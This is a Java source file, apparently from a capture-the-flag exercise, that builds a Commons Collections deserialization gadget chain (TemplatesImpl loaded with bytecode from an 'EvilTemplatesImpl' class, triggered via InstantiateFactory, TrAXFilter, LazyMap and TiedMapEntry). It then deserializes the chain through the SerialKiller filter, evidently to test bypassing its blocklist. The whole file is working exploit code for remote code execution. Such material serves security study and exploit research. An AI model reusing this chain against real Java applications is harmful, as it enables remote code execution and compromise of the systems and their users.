import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.nibblesec.tools.SerialKiller;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "1");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        InstantiateFactory instantiateFactory;
        instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class
        ,new Class[]{javax.xml.transform.Templates.class},new Object[]{obj});

        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

        ConstantTransformer constantTransformer = new ConstantTransformer(1);

        Map innerMap = new HashMap();
        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        setFieldValue(outerMap,"factory",factoryTransformer);

        outerMap.remove("keykey");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream ois = new SerialKiller(byteArrayInputStream, "/Users/y4tacker/Downloads/ezjavaz/serialkiller.xml");
        ois.readObject();



    }
}
